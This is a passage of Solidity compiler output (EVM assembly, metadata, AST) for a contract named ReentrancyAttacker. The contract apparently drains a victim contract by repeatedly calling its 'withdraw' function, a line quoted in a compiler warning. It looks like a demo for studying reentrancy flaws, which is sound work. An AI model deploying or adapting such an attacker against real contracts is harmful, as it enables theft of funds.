											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 415,
											"end": 466,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 415,
											"end": 466,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 415,
											"end": 466,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "OR",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 415,
											"end": 466,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 386,
											"end": 467,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 386,
											"end": 467,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 386,
											"end": 467,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 386,
											"end": 467,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 386,
											"end": 467,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 386,
											"end": 467,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 386,
											"end": 467,
											"name": "DUP7",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 386,
											"end": 467,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 386,
											"end": 467,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 386,
											"end": 467,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 386,
											"end": 467,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "PUSH",
											"source": 0,
											"value": "3F"
										},
										{
											"begin": 386,
											"end": 467,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 386,
											"end": 467,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 386,
											"end": 467,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 386,
											"end": 467,
											"name": "DUP5",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 386,
											"end": 467,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 386,
											"end": 467,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 386,
											"end": 467,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 386,
											"end": 467,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 386,
											"end": 467,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 332,
											"end": 479,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 332,
											"end": 479,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 332,
											"end": 479,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 332,
											"end": 479,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 294,
											"end": 486,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 7,
											"end": 84,
											"name": "tag",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 7,
											"end": 84,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 44,
											"end": 51,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 73,
											"end": 78,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 62,
											"end": 78,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 62,
											"end": 78,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 84,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 7,
											"end": 84,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 7,
											"end": 84,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 84,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 90,
											"end": 208,
											"name": "tag",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 90,
											"end": 208,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 177,
											"end": 201,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "26"
										},
										{
											"begin": 195,
											"end": 200,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 177,
											"end": 201,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "17"
										},
										{
											"begin": 177,
											"end": 201,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 177,
											"end": 201,
											"name": "tag",
											"source": 1,
											"value": "26"
										},
										{
											"begin": 177,
											"end": 201,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 172,
											"end": 175,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 165,
											"end": 202,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 90,
											"end": 208,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 90,
											"end": 208,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 90,
											"end": 208,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 214,
											"end": 436,
											"name": "tag",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 214,
											"end": 436,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 307,
											"end": 311,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 345,
											"end": 347,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 334,
											"end": 343,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 330,
											"end": 348,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 322,
											"end": 348,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 322,
											"end": 348,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 358,
											"end": 429,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 426,
											"end": 427,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 415,
											"end": 424,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 411,
											"end": 428,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 402,
											"end": 408,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 358,
											"end": 429,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 358,
											"end": 429,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 358,
											"end": 429,
											"name": "tag",
											"source": 1,
											"value": "28"
										},
										{
											"begin": 358,
											"end": 429,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 214,
											"end": 436,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 214,
											"end": 436,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 214,
											"end": 436,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 214,
											"end": 436,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 214,
											"end": 436,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 442,
											"end": 540,
											"name": "tag",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 442,
											"end": 540,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 493,
											"end": 499,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 527,
											"end": 532,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 521,
											"end": 533,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 511,
											"end": 533,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 511,
											"end": 533,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 442,
											"end": 540,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 442,
											"end": 540,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 442,
											"end": 540,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 442,
											"end": 540,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 546,
											"end": 693,
											"name": "tag",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 546,
											"end": 693,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 647,
											"end": 658,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 684,
											"end": 687,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 669,
											"end": 687,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 669,
											"end": 687,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 546,
											"end": 693,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 546,
											"end": 693,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 546,
											"end": 693,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 546,
											"end": 693,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 546,
											"end": 693,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 699,
											"end": 1006,
											"name": "tag",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 699,
											"end": 1006,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 767,
											"end": 768,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 777,
											"end": 890,
											"name": "tag",
											"source": 1,
											"value": "32"
										},
										{
											"begin": 777,
											"end": 890,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 791,
											"end": 797,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 788,
											"end": 789,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 785,
											"end": 798,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 777,
											"end": 890,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 777,
											"end": 890,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 777,
											"end": 890,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 876,
											"end": 877,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 871,
											"end": 874,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 867,
											"end": 878,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 861,
											"end": 879,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 857,
											"end": 858,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 852,
											"end": 855,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 848,
											"end": 859,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 841,
											"end": 880,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 813,
											"end": 815,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 810,
											"end": 811,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 806,
											"end": 816,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 801,
											"end": 816,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 801,
											"end": 816,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 777,
											"end": 890,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "32"
										},
										{
											"begin": 777,
											"end": 890,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 777,
											"end": 890,
											"name": "tag",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 777,
											"end": 890,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 908,
											"end": 914,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 905,
											"end": 906,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 902,
											"end": 915,
											"name": "GT",
											"source": 1
										},
										{
											"begin": 899,
											"end": 1000,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 899,
											"end": 1000,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 899,
											"end": 1000,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 988,
											"end": 989,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 979,
											"end": 985,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 974,
											"end": 977,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 970,
											"end": 986,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 963,
											"end": 990,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 899,
											"end": 1000,
											"name": "tag",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 899,
											"end": 1000,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 748,
											"end": 1006,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 699,
											"end": 1006,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 699,
											"end": 1006,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 699,
											"end": 1006,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 699,
											"end": 1006,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1012,
											"end": 1385,
											"name": "tag",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 1012,
											"end": 1385,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1116,
											"end": 1119,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1144,
											"end": 1182,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 1176,
											"end": 1181,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1144,
											"end": 1182,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "19"
										},
										{
											"begin": 1144,
											"end": 1182,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1144,
											"end": 1182,
											"name": "tag",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 1144,
											"end": 1182,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1198,
											"end": 1286,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 1279,
											"end": 1285,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1274,
											"end": 1277,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 1198,
											"end": 1286,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1198,
											"end": 1286,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1198,
											"end": 1286,
											"name": "tag",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 1198,
											"end": 1286,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1191,
											"end": 1286,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": 1191,
											"end": 1286,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1295,
											"end": 1347,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 1340,
											"end": 1346,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1335,
											"end": 1338,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 1328,
											"end": 1332,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1321,
											"end": 1326,
											"name": "DUP7",
											"source": 1
										},
										{
											"begin": 1317,
											"end": 1333,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1295,
											"end": 1347,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 1295,
											"end": 1347,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1295,
											"end": 1347,
											"name": "tag",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 1295,
											"end": 1347,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1372,
											"end": 1378,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1367,
											"end": 1370,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1363,
											"end": 1379,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1356,
											"end": 1379,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1356,
											"end": 1379,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1120,
											"end": 1385,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1012,
											"end": 1385,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1012,
											"end": 1385,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1012,
											"end": 1385,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1012,
											"end": 1385,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1012,
											"end": 1385,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1391,
											"end": 1662,
											"name": "tag",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 1391,
											"end": 1662,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1521,
											"end": 1524,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1543,
											"end": 1636,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 1632,
											"end": 1635,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1623,
											"end": 1629,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1543,
											"end": 1636,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 1543,
											"end": 1636,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1543,
											"end": 1636,
											"name": "tag",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 1543,
											"end": 1636,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1536,
											"end": 1636,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1536,
											"end": 1636,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1653,
											"end": 1656,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1646,
											"end": 1656,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1646,
											"end": 1656,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1391,
											"end": 1662,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1391,
											"end": 1662,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1391,
											"end": 1662,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1391,
											"end": 1662,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1391,
											"end": 1662,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										}
									]
								}
							},
							"sourceList": [
								"contracts/ReentrancyAttack.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.15+commit.e14f2714\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_victimContractAddress\",\"type\":\"address\"}],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/ReentrancyAttack.sol\":\"ReentrancyAttacker\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/ReentrancyAttack.sol\":{\"keccak256\":\"0xff3289d6572841f0a8106b738c1ef2fb1f827d69f6bc0b969314e73c6cc8fcd1\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://a935673383a8a1c680a7d34e3d35f37b6f9ffa6c469ef4cce7159dbc239797d9\",\"dweb:/ipfs/QmcAVbVQGkysXs3XTvwQNCFg28WeAMX2p7qsGdNzsTW8Xc\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 3,
								"contract": "contracts/ReentrancyAttack.sol:ReentrancyAttacker",
								"label": "s_victimContractAddress",
								"offset": 0,
								"slot": "0",
								"type": "t_address"
							},
							{
								"astId": 6,
								"contract": "contracts/ReentrancyAttack.sol:ReentrancyAttacker",
								"label": "s_amount",
								"offset": 0,
								"slot": "1",
								"type": "t_uint256"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"errorCode": "9302",
				"formattedMessage": "Warning: Return value of low-level calls not used.\n  --> contracts/ReentrancyAttack.sol:14:9:\n   |\n14 |         s_victimContractAddress.call(abi.encodeWithSignature(\"withdraw(uint)\", s_amount));\n   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n",
				"message": "Return value of low-level calls not used.",
				"severity": "warning",
				"sourceLocation": {
					"end": 467,
					"file": "contracts/ReentrancyAttack.sol",
					"start": 386
				},
				"type": "Warning"
			}
		],
		"sources": {
			"contracts/ReentrancyAttack.sol": {
				"ast": {
					"absolutePath": "contracts/ReentrancyAttack.sol",
					"exportedSymbols": {
						"ReentrancyAttacker": [
							44
						]
					},
					"id": 45,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "ReentrancyAttacker",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 44,
							"linearizedBaseContracts": [
								44
							],
							"name": "ReentrancyAttacker",
							"nameLocation": "69:18:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 3,
									"mutability": "mutable",
									"name": "s_victimContractAddress",
									"nameLocation": "103:23:0",
									"nodeType": "VariableDeclaration",
									"scope": 44,
									"src": "95:31:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 2,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "95:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 6,
									"mutability": "mutable",
									"name": "s_amount",
									"nameLocation": "138:8:0",
									"nodeType": "VariableDeclaration",
									"scope": 44,
									"src": "133:24:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 4,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "133:4:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"hexValue": "3133303038383936",
										"id": 5,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "149:8:0",
										"typeDescriptions": {
											"typeIdentifier": "t_rational_13008896_by_1",
											"typeString": "int_const 13008896"
										},
										"value": "13008896"
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 15,
										"nodeType": "Block",
										"src": "219:67:0",
										"statements": [
											{
												"expression": {
													"id": 13,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 11,
														"name": "s_victimContractAddress",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 3,
														"src": "230:23:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 12,
														"name": "_victimContractAddress",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 8,
														"src": "256:22:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "230:48:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 14,
												"nodeType": "ExpressionStatement",
												"src": "230:48:0"
											}
										]
									},
									"id": 16,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 9,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 8,
												"mutability": "mutable",
